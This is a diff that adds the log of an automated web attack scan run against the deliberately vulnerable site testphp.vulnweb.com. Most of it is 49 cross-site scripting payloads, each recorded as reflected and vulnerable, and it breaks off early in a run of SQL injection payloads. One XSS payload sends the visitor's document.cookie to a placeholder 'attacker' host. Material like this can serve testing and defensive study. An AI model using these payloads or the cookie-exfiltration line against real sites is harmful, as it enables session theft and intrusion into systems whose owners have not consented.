@@ -1,0 +1,378 @@
+=== Web Security Scan Report ===
+Target: http://testphp.vulnweb.com/hpp/?pp=12
+Start Time: Fri Oct 17 23:01:36 2025
+
+[~] Starting scan on target: http://testphp.vulnweb.com/hpp/?pp=12
+[~] Output file: E:\hack\result\testphp.vulnweb.com.txt
+[~] Collected parameters from crawl: aaaa/, p, pp
+[~] Found parameters: pp, p, aaaa/
+
+[~] Testing parameter 'pp'
+[~] Phase: XSS (testing 49 payloads) on 'pp'
+[XSS] (1/49) Testing payload on pp: </title><svg/onload=confirm(1)>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: </title><svg/onload=confirm(1)>
+    Evidence: irm%281%29%3E">link1</a><br/><a href="params.php?p=valid&pp=</title><svg/onload=confirm(1)>">link2</a><br/><form action="params.php?p=valid&pp=</title>
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (2/49) Testing payload on pp: <script>confirm(1)</script>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <script>confirm(1)</script>
+    Evidence: C%2Fscript%3E">link1</a><br/><a href="params.php?p=valid&pp=<script>confirm(1)</script>">link2</a><br/><form action="params.php?p=valid&pp=<script>
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (3/49) Testing payload on pp: "/><img src=x onerror=alert(1)>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: "/><img src=x onerror=alert(1)>
+    Evidence: ert%281%29%3E">link1</a><br/><a href="params.php?p=valid&pp="/><img src=x onerror=alert(1)>">link2</a><br/><form action="params.php?p=valid&pp="/><img 
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (4/49) Testing payload on pp: <svg><script>alert(1)</script>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <svg><script>alert(1)</script>
+    Evidence: C%2Fscript%3E">link1</a><br/><a href="params.php?p=valid&pp=<svg><script>alert(1)</script>">link2</a><br/><form action="params.php?p=valid&pp=<svg><sc
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (5/49) Testing payload on pp: <body onload=alert('xss')>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <body onload=alert('xss')>
+    Evidence: 7xss%27%29%3E">link1</a><br/><a href="params.php?p=valid&pp=<body onload=alert('xss')>">link2</a><br/><form action="params.php?p=valid&pp=<body on
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (6/49) Testing payload on pp: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+    Evidence: x%2F%2Fv3dm0s">link1</a><br/><a href="params.php?p=valid&pp=</tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s">link2</a><br/><form action="params.php?p=valid&pp=</tItLE>
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (7/49) Testing payload on pp: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+    Evidence: 7xss%27%29%3E">link1</a><br/><a href="params.php?p=valid&pp=<A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>">link2</a><br/><form action="params.php?p=valid&pp=<A%250do
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (8/49) Testing payload on pp: <iframe src="javascript:confirm(1)"></iframe>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <iframe src="javascript:confirm(1)"></iframe>
+    Evidence: C%2Fiframe%3E">link1</a><br/><a href="params.php?p=valid&pp=<iframe src="javascript:confirm(1)"></iframe>">link2</a><br/><form action="params.php?p=valid&pp=<iframe 
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (9/49) Testing payload on pp: <svg onload=alert`1`>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <svg onload=alert`1`>
+    Evidence: ert%601%60%3E">link1</a><br/><a href="params.php?p=valid&pp=<svg onload=alert`1`>">link2</a><br/><form action="params.php?p=valid&pp=<svg onl
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (10/49) Testing payload on pp: '"><svg/onload=alert(1)>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: '"><svg/onload=alert(1)>
+    Evidence: ert%281%29%3E">link1</a><br/><a href="params.php?p=valid&pp='"><svg/onload=alert(1)>">link2</a><br/><form action="params.php?p=valid&pp='"><svg/
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (11/49) Testing payload on pp: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+    Evidence: C%2Fscript%3E">link1</a><br/><a href="params.php?p=valid&pp="><script>new Image().src='//attacker/?c='+document.cookie</script>">link2</a><br/><form action="params.php?p=valid&pp="><scrip
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (12/49) Testing payload on pp: <input autofocus onfocus=alert(1)>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input autofocus onfocus=alert(1)>
+    Evidence: ert%281%29%3E">link1</a><br/><a href="params.php?p=valid&pp=<input autofocus onfocus=alert(1)>">link2</a><br/><form action="params.php?p=valid&pp=<input a
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (13/49) Testing payload on pp: <details open ontoggle=alert(1)>Open</details>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <details open ontoggle=alert(1)>Open</details>
+    Evidence: %2Fdetails%3E">link1</a><br/><a href="params.php?p=valid&pp=<details open ontoggle=alert(1)>Open</details>">link2</a><br/><form action="params.php?p=valid&pp=<details
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (14/49) Testing payload on pp: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+    Evidence: %281%29%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">">link2</a><br/><form action="params.php?p=valid&pp=<meta ht
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (15/49) Testing payload on pp: <object data="javascript:alert(1)"></object>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <object data="javascript:alert(1)"></object>
+    Evidence: C%2Fobject%3E">link1</a><br/><a href="params.php?p=valid&pp=<object data="javascript:alert(1)"></object>">link2</a><br/><form action="params.php?p=valid&pp=<object 
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (16/49) Testing payload on pp: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+    Evidence: %3B%281%29%3E">link1</a><br/><a href="params.php?p=valid&pp=<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>">link2</a><br/><form action="params.php?p=valid&pp=<svg/onl
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (17/49) Testing payload on pp: <img src=x onerror=javascript:confirm%281%29>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <img src=x onerror=javascript:confirm%281%29>
+    Evidence: 25281%2529%3E">link1</a><br/><a href="params.php?p=valid&pp=<img src=x onerror=javascript:confirm%281%29>">link2</a><br/><form action="params.php?p=valid&pp=<img src
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (18/49) Testing payload on pp: <img src="x" onerror="/*
+*/alert(1)">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <img src="x" onerror="/*
+*/alert(1)">
+    Evidence: %281%29%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<img src="x" onerror="/* */alert(1)">">link2</a><br/><form action="params.php?p=valid&pp=<img src
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (19/49) Testing payload on pp: <video><source onerror=alert(1)></video>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <video><source onerror=alert(1)></video>
+    Evidence: 3C%2Fvideo%3E">link1</a><br/><a href="params.php?p=valid&pp=<video><source onerror=alert(1)></video>">link2</a><br/><form action="params.php?p=valid&pp=<video><
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (20/49) Testing payload on pp: <math><mi onmouseover=alert(1)>X</mi></math>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <math><mi onmouseover=alert(1)>X</mi></math>
+    Evidence: %3C%2Fmath%3E">link1</a><br/><a href="params.php?p=valid&pp=<math><mi onmouseover=alert(1)>X</mi></math>">link2</a><br/><form action="params.php?p=valid&pp=<math><m
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (21/49) Testing payload on pp: ' onmouseover=alert(1) x='
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: ' onmouseover=alert(1) x='
+    Evidence: 81%29+x%3D%27">link1</a><br/><a href="params.php?p=valid&pp=' onmouseover=alert(1) x='">link2</a><br/><form action="params.php?p=valid&pp=' onmous
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (22/49) Testing payload on pp: "><svg><g onload=alert(1)></g></svg>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: "><svg><g onload=alert(1)></g></svg>
+    Evidence: E%3C%2Fsvg%3E">link1</a><br/><a href="params.php?p=valid&pp="><svg><g onload=alert(1)></g></svg>">link2</a><br/><form action="params.php?p=valid&pp="><svg><
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (23/49) Testing payload on pp: </textarea><script>alert('xss')</script>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: </textarea><script>alert('xss')</script>
+    Evidence: C%2Fscript%3E">link1</a><br/><a href="params.php?p=valid&pp=</textarea><script>alert('xss')</script>">link2</a><br/><form action="params.php?p=valid&pp=</textar
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (24/49) Testing payload on pp: <a href="javascript:/*
+*/alert(1)">click</a>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <a href="javascript:/*
+*/alert(1)">click</a>
+    Evidence: ick%3C%2Fa%3E">link1</a><br/><a href="params.php?p=valid&pp=<a href="javascript:/* */alert(1)">click</a>">link2</a><br/><form action="params.php?p=valid&pp=<a href=
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (25/49) Testing payload on pp: <a href='javas&#99;ript:alert(1)'>x</a>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <a href='javas&#99;ript:alert(1)'>x</a>
+    Evidence: 3Ex%3C%2Fa%3E">link1</a><br/><a href="params.php?p=valid&pp=<a href='javas&#99;ript:alert(1)'>x</a>">link2</a><br/><form action="params.php?p=valid&pp=<a href=
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (26/49) Testing payload on pp: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+    Evidence: E%3C%2Fsvg%3E">link1</a><br/><a href="params.php?p=valid&pp=<svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>">link2</a><br/><form action="params.php?p=valid&pp=<svg><fo
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (27/49) Testing payload on pp: <form action=javascript:alert(1)><input type=submit></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form action=javascript:alert(1)><input type=submit></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form action=javascript:alert(1)><input type=submit></form>">link2</a><br/><form action="params.php?p=valid&pp=<form ac
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (28/49) Testing payload on pp: <img src=x onerror=eval('con'+'firm(1)')>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <img src=x onerror=eval('con'+'firm(1)')>
+    Evidence: 1%29%27%29%3E">link1</a><br/><a href="params.php?p=valid&pp=<img src=x onerror=eval('con'+'firm(1)')>">link2</a><br/><form action="params.php?p=valid&pp=<img src
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (29/49) Testing payload on pp: <script>setTimeout(()=>alert(1),0)</script>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <script>setTimeout(()=>alert(1),0)</script>
+    Evidence: C%2Fscript%3E">link1</a><br/><a href="params.php?p=valid&pp=<script>setTimeout(()=>alert(1),0)</script>">link2</a><br/><form action="params.php?p=valid&pp=<script>
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (30/49) Testing payload on pp: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+    Evidence: 568%2531%253e">link1</a><br/><a href="params.php?p=valid&pp=%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e">link2</a><br/><form action="params.php?p=valid&pp=%22%3e%3
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (31/49) Testing payload on pp: <input type="text" value="<script>alert('XSS')</script>">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" value="<script>alert('XSS')</script>">
+    Evidence: ript%3E%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" value="<script>alert('XSS')</script>">">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (32/49) Testing payload on pp: <textarea><script>alert('XSS')</script></textarea>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <textarea><script>alert('XSS')</script></textarea>
+    Evidence: 2Ftextarea%3E">link1</a><br/><a href="params.php?p=valid&pp=<textarea><script>alert('XSS')</script></textarea>">link2</a><br/><form action="params.php?p=valid&pp=<textare
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (33/49) Testing payload on pp: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form><button formaction="javascript:alert('XSS')">Click me</button></form>">link2</a><br/><form action="params.php?p=valid&pp=<form><b
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (34/49) Testing payload on pp: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>">link2</a><br/><form action="params.php?p=valid&pp=<form><i
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (35/49) Testing payload on pp: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" onfocus="alert('XSS')" value="Focus me">
+    Evidence: ocus+me%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" onfocus="alert('XSS')" value="Focus me">">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (36/49) Testing payload on pp: <input type="button" value="Click me" onclick="alert('XSS')">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="button" value="Click me" onclick="alert('XSS')">
+    Evidence: S%27%29%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="button" value="Click me" onclick="alert('XSS')">">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (37/49) Testing payload on pp: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>">link2</a><br/><form action="params.php?p=valid&pp=<form ac
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (38/49) Testing payload on pp: <input type="text" value='"><script>alert(1)</script>'>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" value='"><script>alert(1)</script>'>
+    Evidence: ript%3E%27%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" value='"><script>alert(1)</script>'>">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (39/49) Testing payload on pp: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" value='"><img src=x onerror=alert(1)>'>
+    Evidence: 1%29%3E%27%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" value='"><img src=x onerror=alert(1)>'>">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (40/49) Testing payload on pp: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+    Evidence: ript%3E%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">">link2</a><br/><form action="params.php?p=valid&pp=<form><i
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (41/49) Testing payload on pp: <textarea><script>alert('XSS')</script></textarea>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <textarea><script>alert('XSS')</script></textarea>
+    Evidence: 2Ftextarea%3E">link1</a><br/><a href="params.php?p=valid&pp=<textarea><script>alert('XSS')</script></textarea>">link2</a><br/><form action="params.php?p=valid&pp=<textare
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (42/49) Testing payload on pp: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form><button formaction="javascript:alert('XSS')">Click me</button></form>">link2</a><br/><form action="params.php?p=valid&pp=<form><b
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (43/49) Testing payload on pp: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>">link2</a><br/><form action="params.php?p=valid&pp=<form><i
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (44/49) Testing payload on pp: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" onfocus="alert('XSS')" value="Focus me">
+    Evidence: ocus+me%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" onfocus="alert('XSS')" value="Focus me">">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (45/49) Testing payload on pp: <input type="button" value="Click me" onclick="alert('XSS')">
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="button" value="Click me" onclick="alert('XSS')">
+    Evidence: S%27%29%22%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="button" value="Click me" onclick="alert('XSS')">">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (46/49) Testing payload on pp: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>">link2</a><br/><form action="params.php?p=valid&pp=<form ac
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (47/49) Testing payload on pp: <input type="text" value='"><script>alert(1)</script>'>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" value='"><script>alert(1)</script>'>
+    Evidence: ript%3E%27%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" value='"><script>alert(1)</script>'>">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (48/49) Testing payload on pp: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <input type="text" value='"><img src=x onerror=alert(1)>'>
+    Evidence: 1%29%3E%27%3E">link1</a><br/><a href="params.php?p=valid&pp=<input type="text" value='"><img src=x onerror=alert(1)>'>">link2</a><br/><form action="params.php?p=valid&pp=<input t
+    CVEs found: -
+    CVSS: -  Severity: Low
+[XSS] (49/49) Testing payload on pp: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+[++] Vulnerable webpage: http://testphp.vulnweb.com/hpp/?pp=12
+[++] Parameter: pp
+[++] Vector: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+    Evidence: %3C%2Fform%3E">link1</a><br/><a href="params.php?p=valid&pp=<form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>">link2</a><br/><form action="params.php?p=valid&pp=<form><i
+    CVEs found: -
+    CVSS: -  Severity: Low
+[~] Proceeding to SQLi phase (testing 114 payloads) for 'pp'.
+[SQLi] (1/114) Testing payload on pp: ' OR '1'='1' -- 
+[SQLi] (1) No SQL error signature detected (resp_time=0.42s).
+[SQLi] (2/114) Testing payload on pp: " OR "1"="1" -- 
+[SQLi] (2) No SQL error signature detected (resp_time=0.45s).
+[SQLi] (3/114) Testing payload on pp: ' UNION SELECT NULL--
+[SQLi] (3) No SQL error signature detected (resp_time=0.80s).
+[SQLi] (4/114) Testing payload on pp: ' OR sleep(5)--
+[SQLi] (4) No SQL error signature detected (resp_time=0.44s).
+[SQLi] (5/114) Testing payload on pp: '; WAITFOR DELAY '0:0:5'--
+[SQLi] (5) No SQL error signature detected (resp_time=0.45s).
+[SQLi] (6/114) Testing payload on pp: 1' OR 'a'='a'--
+[SQLi] (6) No SQL error signature detected (resp_time=0.46s).
+[SQLi] (7/114) Testing payload on pp:  1' ORDER BY 1--+
+[SQLi] (7) No SQL error signature detected (resp_time=0.44s).
+[SQLi] (8/114) Testing payload on pp: 1' ORDER BY 2--+
+[SQLi] (8) No SQL error signature detected (resp_time=0.47s).
+[SQLi] (9/114) Testing payload on pp: 1' ORDER BY 3--+
+[SQLi] (9) No SQL error signature detected (resp_time=0.45s).
+[SQLi] (10/114) Testing payload on pp: 1' ORDER BY 1,2--+
